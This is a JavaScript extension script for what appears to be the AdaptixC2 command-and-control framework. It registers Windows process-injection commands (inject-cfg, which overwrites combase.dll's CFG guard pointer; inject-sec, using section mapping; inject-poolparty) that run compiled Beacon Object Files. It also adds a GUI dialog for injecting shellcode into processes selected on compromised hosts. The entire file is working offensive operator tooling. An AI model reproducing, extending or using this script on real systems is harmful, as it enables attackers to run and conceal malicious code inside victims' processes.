var metadata = {
    name: "Injection-BOF",
    description: "BOFs for process injection"
};

/// COMMANDS

var cmd_inject_cfg = ax.create_command("inject-cfg", "Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr", "inject-cfg 808 /tmp/shellcode.bin");
cmd_inject_cfg.addArgInt("pid", true);
cmd_inject_cfg.addArgFile("shellcode", true);
cmd_inject_cfg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/inject_cfg." + ax.arch(id) + ".o";
    let message = "Task: Executing DataInject-BOF by @0xLegacyy";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var cmd_inject_sec = ax.create_command("inject-sec", "Injects desired shellcode into target process using section mapping", "inject-sec 808 /tmp/shellcode.bin");
cmd_inject_sec.addArgInt("pid", true);
cmd_inject_sec.addArgFile("shellcode", true);
cmd_inject_sec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/inject_sec." + ax.arch(id) + ".o";
    let message = "Task: inject shellcode (section mapping)";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var cmd_inject_poolparty = ax.create_command("inject-poolparty", "Injects desired shellcode into target process using specified pool party technique", "inject-poolparty 999 /tmp/shellcode.bin 7");
cmd_inject_poolparty.addArgInt("pid", true)
cmd_inject_poolparty.addArgFile("shellcode", true);
cmd_inject_poolparty.addArgInt("technique", false);

cmd_inject_poolparty.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];
    let technique = parsed_json["technique"];

    let bof_params = ax.bof_pack("int,bytes,int", [pid, shellcode_content, technique]);
    let bof_path = ax.script_dir() + "_bin/inject_poolparty." + ax.arch(id) + ".o";
    let message = "Task: inject shellcode (pool party " + "technique " + technique +")";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var group_exec = ax.create_commands_group("Injection-BOF", [cmd_inject_cfg, cmd_inject_sec, cmd_inject_poolparty]);
ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);

/// MENU

let inject_action = menu.create_action("Inject shellcode", function(process_list) {
    let methods = {
        "inject-sec": "Injects desired shellcode into target process using section mapping",
        "inject-cfg": "Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr",
        "inject-poolparty": "Injects desired shellcode into target process using pool party"
    };
    let label_shellcode  = form.create_label("Shellcode file:");
    let text_shellcode   = form.create_textline();
    let button_shellcode = form.create_button("...");

    let label_method = form.create_label("Inject method:");
    let combo_method = form.create_combo();
    combo_method.addItems(["inject-sec", "inject-cfg", "inject-poolparty"]);

    let text_description = form.create_textmulti( methods["inject-sec"] );
    text_description.setReadOnly(true);

    let layout = form.create_gridlayout();
    layout.addWidget(label_shellcode,  0, 0, 1, 1);
    layout.addWidget(text_shellcode,   0, 1, 1, 1);
    layout.addWidget(button_shellcode, 0, 2, 1, 1);
    layout.addWidget(label_method,     1, 0, 1, 1);
    layout.addWidget(combo_method,     1, 1, 1, 2);
    layout.addWidget(text_description, 2, 0, 1, 3);

    form.connect(combo_method, "currentTextChanged", function(text) {
        text_description.setText( methods[text] );
    });

    form.connect(button_shellcode, "clicked", function() {
        text_shellcode.setText( ax.prompt_open_file() );
    });

    let dialog = form.create_dialog("Inject shellcode");
    dialog.setSize(460, 240);
    dialog.setLayout(layout);
    dialog.setButtonsText("Inject", "Cancel");
    while ( dialog.exec() == true )  {
        let shellcode_path = text_shellcode.text();
        if(shellcode_path.length == 0) { ax.show_message("Error", "Shellcode not specified"); continue; }

        let shellcode_content = ax.file_read(shellcode_path);
        if(shellcode_content.length == 0) { ax.show_message("Error", `file ${shellcode_path} not readed`); continue; }

        let method = combo_method.currentText();

        process_list.forEach((proc) => {
            let command = `${method} ${proc.pid} ${shellcode_path}`;
            ax.execute_command(proc.agent_id, command);
        });
        break;
    }
});
menu.add_processbrowser(inject_action, ["beacon", "gopher"], ["windows"]);
